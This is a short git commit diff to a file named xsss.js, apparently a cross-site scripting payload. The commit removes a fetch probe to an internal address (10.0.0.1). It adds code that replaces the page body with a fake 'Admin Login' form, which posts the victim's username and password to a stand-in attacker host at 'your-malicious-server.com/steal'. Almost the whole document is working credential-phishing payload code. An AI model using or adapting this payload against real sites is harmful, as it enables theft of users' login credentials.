4b68ab140b5d2179d36db6b236bcf79dd4e10d71
Ahmedhr1 <145652506+Ahmedhr1@users.noreply.github.com>
2025-02-19 20:27:48 +0100

    Update xsss.js

--- xsss.js
+++ xsss.js
@@ -1,4 +1,8 @@
-fetch("http://10.0.0.1", { method: "OPTIONS" })
-  .then(response => response.text())
-  .then(data => console.log("OPTIONS Response:", data))
-  .catch(error => console.log("Fetch error:", error));
+document.body.innerHTML = `
+  <h2>Admin Login</h2>
+  <form action="https://your-malicious-server.com/steal" method="POST">
+    <input type="text" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Login</button>
+  </form>
+`;
